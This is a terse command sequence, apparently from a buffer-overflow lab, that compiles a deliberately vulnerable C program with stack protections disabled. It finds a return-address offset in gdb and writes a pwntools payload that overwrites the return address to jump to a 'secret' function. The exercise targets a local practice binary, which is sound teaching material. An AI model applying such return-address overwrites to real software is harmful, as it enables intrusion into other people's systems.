mkdir ~/buffer_overflow_lab
nano vulnerable.c
gcc -fno-stack-protector -z execstack -no-pie -g vulnerable.c -o vulnerable
gdb ./vulnerable
(gdb) break vulnerable
(gdb) run $(python3 -c 'print("A"*100)')
(gdb) info registers rip
(gdb) info address secret
python3 -c 'import sys; from pwn import *; sys.stdout.buffer.write(b"A"*72 + p64(0x401146))' > payload.txt
./vulnerable < payload.txt
